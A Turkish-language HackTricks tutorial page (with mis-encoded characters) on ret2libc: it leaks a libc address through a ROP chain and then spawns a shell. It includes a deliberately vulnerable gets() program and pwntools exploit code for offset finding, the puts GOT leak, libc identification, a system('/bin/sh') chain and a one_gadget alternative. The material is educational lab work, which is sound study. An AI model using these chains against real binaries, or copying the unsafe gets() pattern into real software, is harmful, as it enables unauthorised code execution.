# ROP ile libc adresini sÄ±zdÄ±rma

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## HÄ±zlÄ± Ã–zeti

1. **TaÅŸma** **offset'ini bulun**
2. **`POP_RDI` gadget'Ä±nÄ±, `PUTS_PLT` ve `MAIN`'i bulun**
3. Ã–nceki gadget'larÄ± kullanarak puts veya baÅŸka bir libc fonksiyonunun **bellek adresini sÄ±zdÄ±rÄ±n** ve **libc sÃ¼rÃ¼mÃ¼nÃ¼ bulun** ([indirin](https://libc.blukat.me))
4. KÃ¼tÃ¼phane ile, **ROP'u hesaplayÄ±n ve bunu istismar edin**

## Pratik yapmak iÃ§in diÄŸer eÄŸitimler ve ikili dosyalar

Bu eÄŸitim, bu eÄŸitimde Ã¶nerilen kod/ikili dosyayÄ± istismar edecek: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
DiÄŸer yararlÄ± eÄŸitimler: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Kod

Dosya adÄ±: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - LIBC SÄ±zÄ±ntÄ± Åablonu

SaldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in burada bulunan kodu kullanacaÄŸÄ±m.\
SaldÄ±rÄ±yÄ± indirin ve bunu, zayÄ±f ikili dosya ile aynÄ± dizine yerleÅŸtirin ve script'e gerekli verileri verin:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- Ofseti Bulma

Åablon, saldÄ±rÄ±ya devam etmeden Ã¶nce bir ofsete ihtiyaÃ§ duyar. Herhangi bir ofset saÄŸlanÄ±rsa, bunu bulmak iÃ§in gerekli kodu Ã§alÄ±ÅŸtÄ±racaktÄ±r (varsayÄ±lan olarak `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Ã‡alÄ±ÅŸtÄ±r** `python template.py` bir GDB konsolu aÃ§Ä±lacak ve program Ã§Ã¶kertilecektir. O **GDB konsolu** iÃ§inde `x/wx $rsp` komutunu Ã§alÄ±ÅŸtÄ±rarak RIP'i geÃ§ecek **baytlarÄ±** al. Son olarak, bir **python** konsolu kullanarak **offset** deÄŸerini al:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../../.gitbook/assets/image (140).png>)

Offset'u bulduktan sonra (bu durumda 40) bu deÄŸeri kullanarak ÅŸablon iÃ§indeki OFFSET deÄŸiÅŸkenini deÄŸiÅŸtirin.\
`OFFSET = "A" * 40`

BaÅŸka bir yol ise: `pattern create 1000` -- _ret'e kadar Ã§alÄ±ÅŸtÄ±r_ -- `pattern seach $rsp` komutunu GEF'den kullanmaktÄ±r.

## 2- Gadget'larÄ± Bulma

ArtÄ±k ikili dosya iÃ§inde ROP gadget'larÄ±nÄ± bulmamÄ±z gerekiyor. Bu ROP gadget'larÄ±, kullanÄ±lan **libc**'yi bulmak iÃ§in `puts` Ã§aÄŸÄ±rmak ve daha sonra **son istismarÄ± baÅŸlatmak** iÃ§in faydalÄ± olacaktÄ±r.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
`PUTS_PLT`, **puts** fonksiyonunu Ã§aÄŸÄ±rmak iÃ§in gereklidir.\
`MAIN_PLT`, bir etkileÅŸimden sonra **overflow**'u **tekrar** **istismar** etmek iÃ§in **main function**'Ä± tekrar Ã§aÄŸÄ±rmak iÃ§in gereklidir (sonsuz istismar dÃ¶ngÃ¼leri). **Her ROP'un sonunda programÄ± tekrar Ã§aÄŸÄ±rmak iÃ§in kullanÄ±lÄ±r.**\
**POP\_RDI**, Ã§aÄŸrÄ±lan fonksiyona bir **parametre** **geÃ§mek** iÃ§in gereklidir.

Bu adÄ±mda hiÃ§bir ÅŸey Ã§alÄ±ÅŸtÄ±rmanÄ±za gerek yoktur, Ã§Ã¼nkÃ¼ her ÅŸey pwntools tarafÄ±ndan yÃ¼rÃ¼tme sÄ±rasÄ±nda bulunacaktÄ±r.

## 3- libc kÃ¼tÃ¼phanesini bulma

ArtÄ±k hangi sÃ¼rÃ¼mde **libc** kÃ¼tÃ¼phanesinin kullanÄ±ldÄ±ÄŸÄ±nÄ± bulma zamanÄ±. Bunu yapmak iÃ§in, **puts** fonksiyonunun bellek adresini **sÄ±zdÄ±racaÄŸÄ±z** ve ardÄ±ndan o adreste hangi **kÃ¼tÃ¼phane sÃ¼rÃ¼mÃ¼** olduÄŸunu **arama** yapacaÄŸÄ±z.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Bunu yapmak iÃ§in, yÃ¼rÃ¼tÃ¼len kodun en Ã¶nemli satÄ±rÄ± ÅŸudur:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Bu, bazÄ± baytlarÄ± **RIP**'i **aÅŸÄ±ndÄ±rmak** mÃ¼mkÃ¼n olana kadar gÃ¶nderecektir: `OFFSET`.\
Sonra, `POP_RDI` gadget'Ä±nÄ±n **adresini** ayarlayacak, bÃ¶ylece bir sonraki adres (`FUNC_GOT`) **RDI** kaydÄ±nda saklanacaktÄ±r. Bunun nedeni, **puts**'u **Ã§aÄŸÄ±rmak** istememizdir, **PUTS_GOT**'Ä±n adresini geÃ§irerek, Ã§Ã¼nkÃ¼ puts fonksiyonunun bellek adresi `PUTS_GOT` tarafÄ±ndan iÅŸaret edilen adreste saklanmaktadÄ±r.\
Bundan sonra, `PUTS_PLT` Ã§aÄŸrÄ±lacak (iÃ§inde **RDI**'de `PUTS_GOT` ile) bÃ¶ylece puts, `PUTS_GOT` iÃ§indeki iÃ§eriÄŸi (**puts fonksiyonunun bellek adresi**) **okuyacak** ve **yazdÄ±racaktÄ±r**.\
Son olarak, **ana fonksiyon tekrar Ã§aÄŸrÄ±lÄ±r** bÃ¶ylece taÅŸmayÄ± tekrar istismar edebiliriz.

Bu ÅŸekilde, **puts fonksiyonunu** **belirli bir adresi** **bellekte** **yazdÄ±rmasÄ±** iÃ§in **kandÄ±rdÄ±k** (bu, **libc** kÃ¼tÃ¼phanesinin iÃ§indedir). ArtÄ±k bu adrese sahip olduÄŸumuza gÃ¶re, **hangi libc sÃ¼rÃ¼mÃ¼nÃ¼n kullanÄ±ldÄ±ÄŸÄ±nÄ± arayabiliriz**.

![](<../../../../../.gitbook/assets/image (141).png>)

**Yerel** bir ikiliyi **istismar** ettiÄŸimiz iÃ§in, hangi **libc** sÃ¼rÃ¼mÃ¼nÃ¼n kullanÄ±ldÄ±ÄŸÄ±nÄ± bulmamÄ±za **gerek yoktur** (sadece `/lib/x86_64-linux-gnu/libc.so.6` iÃ§indeki kÃ¼tÃ¼phaneyi bul).\
Ancak, uzaktan bir istismar durumunda, burada nasÄ±l bulabileceÄŸinizi aÃ§Ä±klayacaÄŸÄ±m:

### 3.1- libc sÃ¼rÃ¼mÃ¼nÃ¼ arama (1)

Hangi kÃ¼tÃ¼phanenin kullanÄ±ldÄ±ÄŸÄ±nÄ± web sayfasÄ±nda arayabilirsiniz: [https://libc.blukat.me/](https://libc.blukat.me)\
AyrÄ±ca, keÅŸfedilen **libc** sÃ¼rÃ¼mÃ¼nÃ¼ indirmenize de izin verecektir.

![](<../../../../../.gitbook/assets/image (142).png>)

### 3.2- libc sÃ¼rÃ¼mÃ¼nÃ¼ arama (2)

AyrÄ±ca ÅŸunlarÄ± yapabilirsiniz:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Bu biraz zaman alacaktÄ±r, sabÄ±rlÄ± olun.\
Bunun Ã§alÄ±ÅŸmasÄ± iÃ§in ÅŸunlara ihtiyacÄ±mÄ±z var:

* Libc sembol adÄ±: `puts`
* SÄ±zdÄ±rÄ±lan libc adresi: `0x7ff629878690`

Hangi **libc**'nin muhtemelen kullanÄ±ldÄ±ÄŸÄ±nÄ± belirleyebiliriz.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Ä°ki eÅŸleÅŸme alÄ±yoruz (ilk Ã§alÄ±ÅŸmÄ±yorsa ikinciyi denemelisiniz). Ä°lkini indirin:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
`libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` dosyasÄ±nÄ± Ã§alÄ±ÅŸma dizinimize kopyalayÄ±n.

### 3.3- SÄ±zdÄ±rmak iÃ§in diÄŸer fonksiyonlar
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Bulunan libc adresi ve istismar etme

Bu noktada kullanÄ±lan libc kÃ¼tÃ¼phanesini bilmemiz gerekiyor. Yerel bir ikiliyi istismar ettiÄŸimiz iÃ§in sadece ÅŸunu kullanacaÄŸÄ±m: `/lib/x86_64-linux-gnu/libc.so.6`

Bu nedenle, `template.py` dosyasÄ±nÄ±n baÅŸÄ±nda **libc** deÄŸiÅŸkenini ÅŸuna deÄŸiÅŸtirin: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #KÃ¼tÃ¼phane yolunu bildiÄŸinizde ayarlayÄ±n`

**libc kÃ¼tÃ¼phanesine** **yolu** vererek, geri kalan **istismar otomatik olarak hesaplanacak**.

`get_addr` fonksiyonu iÃ§inde **libc'nin temel adresi** hesaplanacak:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Not edin ki **son libc temel adresi 00 ile bitmelidir**. EÄŸer durumunuz bÃ¶yle deÄŸilse, yanlÄ±ÅŸ bir kÃ¼tÃ¼phane sÄ±zdÄ±rmÄ±ÅŸ olabilirsiniz.
{% endhint %}

Daha sonra, `system` fonksiyonunun adresi ve **adres** _"/bin/sh"_ dizesi **libc**'nin **temel adresinden** hesaplanacak ve **libc kÃ¼tÃ¼phanesine** verilecektir.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Sonunda, /bin/sh yÃ¼rÃ¼tme istismarÄ± hazÄ±rlanacak ve gÃ¶nderilecektir:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Son ROP'u aÃ§Ä±klayalÄ±m.\
Son ROP (`rop1`), ana fonksiyonu tekrar Ã§aÄŸÄ±rarak sona erdi, bu yÃ¼zden **yine istismar edebiliriz** **overflow** (bu yÃ¼zden `OFFSET` burada tekrar var). ArdÄ±ndan, **"/bin/sh"** (_BINSH_) adresine iÅŸaret eden `POP_RDI`'yi Ã§aÄŸÄ±rmak ve **system** fonksiyonunu (`SYSTEM`) Ã§aÄŸÄ±rmak istiyoruz Ã§Ã¼nkÃ¼ _"/bin/sh"_ adresi bir parametre olarak geÃ§ilecektir.\
Son olarak, **Ã§Ä±kÄ±ÅŸ fonksiyonunun adresi** **Ã§aÄŸrÄ±lÄ±r** bÃ¶ylece iÅŸlem **gÃ¼zel bir ÅŸekilde Ã§Ä±kar** ve herhangi bir uyarÄ± Ã¼retilmez.

**Bu ÅŸekilde istismar bir \_/bin/sh**\_\*\* shell'i Ã§alÄ±ÅŸtÄ±racaktÄ±r.\*\*

![](<../../../../../.gitbook/assets/image (143).png>)

## 4(2)- ONE\_GADGET KULLANMA

AyrÄ±ca, **system** ve **"/bin/sh"** kullanmak yerine bir shell elde etmek iÃ§in [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) kullanabilirsiniz. **ONE\_GADGET**, libc kÃ¼tÃ¼phanesi iÃ§inde sadece bir **ROP adresi** kullanarak bir shell elde etmenin bir yolunu bulacaktÄ±r.\
Ancak, genellikle bazÄ± kÄ±sÄ±tlamalar vardÄ±r, en yaygÄ±n ve kaÃ§Ä±nmasÄ± kolay olanlar `[rsp+0x30] == NULL` gibidir. **RSP** iÃ§indeki deÄŸerleri kontrol ettiÄŸiniz iÃ§in, kÄ±sÄ±tlamanÄ±n aÅŸÄ±lmasÄ± iÃ§in sadece biraz daha NULL deÄŸeri gÃ¶ndermeniz yeterlidir.

![](<../../../../../.gitbook/assets/image (615).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT DOSYASI

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± istismar etmek iÃ§in bir ÅŸablon burada bulunabilir:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## YaygÄ±n problemler

### MAIN\_PLT = elf.symbols\['main'] bulunamadÄ±

EÄŸer "main" sembolÃ¼ yoksa, ana kodun nerede olduÄŸunu bulabilirsiniz:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
ve adresi manuel olarak ayarlayÄ±n:
```python
MAIN_PLT = 0x401080
```
### Puts bulunamadÄ±

EÄŸer ikili dosya Puts kullanmÄ±yorsa, kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± kontrol etmelisiniz.

### `sh: 1: %s%s%s%s%s%s%s%s: bulunamadÄ±`

EÄŸer **tÃ¼m** istismarÄ± oluÅŸturduktan sonra bu **hata** ile karÅŸÄ±laÅŸÄ±rsanÄ±z: `sh: 1: %s%s%s%s%s%s%s%s: bulunamadÄ±`

**"/bin/sh" adresinden 64 byte Ã§Ä±karmayÄ±** deneyin:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
